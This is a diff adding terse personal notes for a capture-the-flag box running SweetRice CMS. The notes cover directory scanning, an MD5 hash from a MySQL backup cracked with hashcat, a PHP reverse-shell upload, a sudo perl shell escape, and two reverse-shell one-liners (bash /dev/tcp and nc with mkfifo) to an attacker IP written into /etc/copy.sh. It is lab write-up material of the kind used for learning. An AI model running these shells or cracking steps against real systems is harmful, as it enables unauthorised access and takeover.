@@ -12,3 +12,65 @@ RECON
 		|_http-title: Apache2 Ubuntu Default Page: It works
 		|_http-server-header: Apache/2.4.18 (Ubuntu)
 		Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+		
+	dirsearch -u http://10.10.105.164/
+		[08:07:00] 301 -  316B  - /content  ->  http://10.10.105.164/content/       
+		[08:07:02] 200 -    2KB - /content/ 
+			SWEETRICE 
+	dirsearch -u http://10.10.105.164/content/
+			[08:12:32] 200 -  964B  - /content/_themes/                                 
+			[08:13:13] 200 -   18KB - /content/changelog.txt                            
+			[08:13:40] 200 -    3KB - /content/images/                                  
+			[08:13:40] 301 -  323B  - /content/images  ->  http://10.10.105.164/content/images/
+			[08:13:40] 301 -  320B  - /content/inc  ->  http://10.10.105.164/content/inc/
+			[08:13:40] 200 -    7KB - /content/inc/                                     
+			[08:13:41] 200 -    2KB - /content/index.php                                
+			[08:13:41] 200 -    2KB - /content/index.php/login/                         
+			[08:13:44] 200 -    2KB - /content/js/                                      
+			[08:13:48] 200 -   15KB - /content/license.txt      
+															/as --(sweetrice login page)
+															
+															
+															
+		/content/inc/mysql_backup/
+			download the file,
+				analyze it
+				
+			name : lazy admin, manager
+			password : 42f749ade7f9e195bf475f37a44cafcb  -- decode 
+				hash-identifier = md5
+				hashcat -h | grep md5 --> 0
+				
+				hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+				42f749ade7f9e195bf475f37a44cafcb: Password123 
+				
+				http://10.10.105.164/content/as/
+				username = manager
+				passwd = password123
+				
+				exploitation
+		upload a php rev shell and modify the extension to php5
+
+		sudo /usr/bin/perl -e 'exec "/bin/sh";'
+		
+		
+			-priv esc
+		
+	
+	echo "bash -i >& /dev/tcp/10.17.81.162/445 0>&1" /etc/copy.sh
+
+ 	echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.81.162 4244 >/tmp/f" > /etc/copy.sh
+ 	
+ 	
+
+
+
+
+
+
+
+
+
+
+
+
